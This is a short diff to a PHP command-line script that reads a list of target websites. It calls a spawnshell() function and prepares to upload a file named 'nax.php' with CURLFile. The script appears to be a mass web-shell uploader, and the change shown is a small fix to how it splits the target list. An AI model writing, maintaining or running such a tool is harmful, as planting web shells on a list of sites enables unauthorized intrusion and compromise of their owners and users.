@@ -52,7 +52,7 @@ $web = $argv[1];
 if (!$web) exit("{$red}[!] Usage php {$argv[0]} list.txt\n");
 if (!file_exists($web)) exit("{$red}[!] File {$argv[1]} not found\n");
 $get = file_get_contents($web);
-$exp = explode("\n", $get);
+$exp = explode(PHP_EOL, $get);
 
 spawnshell();
 $shell = new CURLFile("nax.php");
